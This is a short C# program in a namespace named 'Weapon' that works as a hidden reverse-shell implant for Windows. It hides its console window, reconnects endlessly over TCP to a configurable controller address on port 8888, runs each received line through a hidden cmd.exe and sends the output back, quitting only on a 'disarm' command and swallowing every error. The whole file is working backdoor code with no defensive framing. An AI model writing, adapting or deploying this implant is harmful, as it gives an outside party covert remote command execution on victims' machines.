using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Net.Sockets;
using System.IO;
using System.Runtime.InteropServices; //hide window

namespace Weapon
{
    class Program
    {
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
        const int SW_SHOW = 5;

        static void Main(string[] args)
        {
            var handle = GetConsoleWindow();
            // Hide
            ShowWindow(handle, SW_HIDE);
            // Show
            //ShowWindow(handle, SW_SHOW);

            string ip = "127.0.0.1"; //Change to IP that weapon is running on
            TcpClient server;
            while (true)
            {
                try
                {
                    server = new TcpClient(ip, 8888); //Port that weapon is listening on
                    if (server.Connected)
                    {
                        StreamReader reader = new StreamReader(server.GetStream());
                        StreamWriter writer = new StreamWriter(server.GetStream());
                        writer.AutoFlush = true;
                        string message = reader.ReadLine();
                        if (message == "disarm")
                        {
                            Environment.Exit(0);
                        }
                        System.Diagnostics.Process process = new System.Diagnostics.Process();
                        System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
                        startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
                        startInfo.FileName = "cmd.exe";
                        startInfo.Arguments = "/C " + message;
                        startInfo.UseShellExecute = false;
                        startInfo.RedirectStandardOutput = true;
                        process.StartInfo = startInfo;
                        process.Start();
                        string output = process.StandardOutput.ReadToEnd();
                        process.WaitForExit();
                        writer.WriteLine(output);
                        reader.Close();
                        writer.Close();
                        server.Close();
                    }
                }
                catch (Exception ex)
                {

                }
            }
        }
    }
}
